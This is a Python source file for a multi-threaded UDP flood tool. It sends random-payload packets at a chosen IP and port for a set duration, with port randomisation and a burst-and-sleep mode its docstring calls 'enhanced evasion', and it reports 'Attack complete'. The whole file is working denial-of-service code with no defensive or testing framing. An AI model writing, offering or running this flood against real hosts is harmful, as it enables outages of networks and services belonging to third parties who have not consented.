import socket
import random
import time
import threading
import multiprocessing

def get_max_threads(safety_factor: float = 0.8) -> int:
    """Auto-detect optimal thread count."""
    return max(1, int(multiprocessing.cpu_count() * safety_factor))

def udp_worker(target_ip, target_port, packet_size, stop_time, randomize_ports, burst, sleep, stats, lock):
    """Thread to send UDP packets with optional burst + sleep mode."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while time.time() < stop_time:
        for _ in range(burst):
            if time.time() >= stop_time:
                break
            try:
                port = random.randint(1, 65535) if randomize_ports else target_port
                size = random.randint(512, packet_size)  # Adaptive size
                payload = random._urandom(size)
                sock.sendto(payload, (target_ip, port))
                with lock:
                    stats["sent"] += 1
            except Exception:
                continue
        time.sleep(sleep)

def udp_flood(
    target_ip: str,
    target_port: int,
    duration: int,
    packet_size: int = 1024,
    num_threads: int = 0,
    randomize_ports: bool = False,
    burst: int = 500,
    sleep: float = 0.5
):
    """Multi-threaded UDP flood with enhanced evasion & control."""
    if num_threads <= 0:
        num_threads = get_max_threads()

    stop_time = time.time() + duration
    stats = {"sent": 0}
    lock = threading.Lock()
    threads = []

    print("=" * 60)
    print(f"[ UDP Flood ] Target        : {target_ip}:{target_port}")
    print(f"[ UDP Flood ] Duration      : {duration}s")
    print(f"[ UDP Flood ] Packet Size   : {packet_size} bytes (MAX)")
    print(f"[ UDP Flood ] Threads       : {num_threads}")
    print(f"[ UDP Flood ] Random Ports  : {'ENABLED' if randomize_ports else 'DISABLED'}")
    print(f"[ UDP Flood ] Burst Mode    : {burst} packets, {sleep}s sleep")
    print("=" * 60)

    for _ in range(num_threads):
        t = threading.Thread(
            target=udp_worker,
            args=(target_ip, target_port, packet_size, stop_time, randomize_ports, burst, sleep, stats, lock)
        )
        t.daemon = True
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("=" * 60)
    print(f"[ UDP Flood ] Attack complete.")
    print(f"[ UDP Flood ] Total packets sent: {stats['sent']}")
    print("=" * 60)
